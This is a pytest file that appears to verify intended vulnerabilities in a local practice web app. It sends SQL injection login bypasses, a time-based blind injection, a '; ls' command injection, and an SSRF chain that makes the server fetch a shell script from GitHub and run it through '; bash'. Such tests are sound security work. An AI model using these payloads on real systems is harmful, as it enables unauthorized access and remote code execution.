import pytest
import requests

def classic_sql():
    """
    Classic Sql injection Test
    """
    logindata = {"username": "\' OR \'1\'=\'1", "password": ""}

    with requests.Session() as s:
        req = s.post("http://localhost/login", data=logindata, allow_redirects=True)
        return b"admin:" in req.content


def blind_sql():
    """
    Blind Sql injection Test
    """
    logindata = {"username": "admin' AND SLEEP(10)#", "password": ""}

    with requests.Session() as s:
        try:
            req = s.post("http://localhost/login", data=logindata, timeout=5)
            return False
        except:
            return True

def ssrf_request():
    """
    SSRF Test
    """
    logindata = {"username": "admin", "password": "admin"}
    SSRFdata = {"title": "PytestInjection", "videourl": "https://raw.githubusercontent.com/f1rehaz4rd/ritsecScripts/master/test.sh"}

    admin_data = {"username": "; bash static/videos/test.sh"}

    with requests.Session() as s:
        req = s.post("http://localhost/login", data=logindata, allow_redirects=True)
        uploadreq = s.get("http://localhost/uploadlink", data=SSRFdata)
        
        test = s.post("http://localhost/adminpanel", data=admin_data, allow_redirects=True)
        return b"ran!!!" in test.content


def command_injection():
    """
    Command Injection Test
    """
    admin_data = {"username": "; ls"}

    with requests.Session() as s:
        req = s.post("http://localhost/adminpanel", data=admin_data, allow_redirects=True)
        return b"Dockerfile" in req.content

def test_vulns():
    assert classic_sql() == True
    assert blind_sql() == True
    assert command_injection() == True